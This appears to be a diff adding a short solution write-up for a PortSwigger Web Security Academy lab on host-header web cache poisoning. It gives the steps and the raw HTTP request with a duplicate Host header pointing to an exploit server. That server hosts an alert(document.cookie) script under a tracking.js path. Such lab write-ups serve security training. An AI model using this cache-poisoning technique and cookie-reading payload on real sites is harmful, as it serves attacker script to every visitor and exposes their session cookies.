@@ -1,0 +1,10 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
+
+Create cache buster parameter and value (hello=world).
+Add second host header with exploit server as value.
+On exploit server create a path called "/resources/js/tracking.js" and add alert(document.cookie) to file.
+
+GET /?hello=world HTTP/1.1
+Host: [SUB_DOMAIN].h1-web-security-academy.net
+Host: [SUB_DOMAIN].exploit-server.net
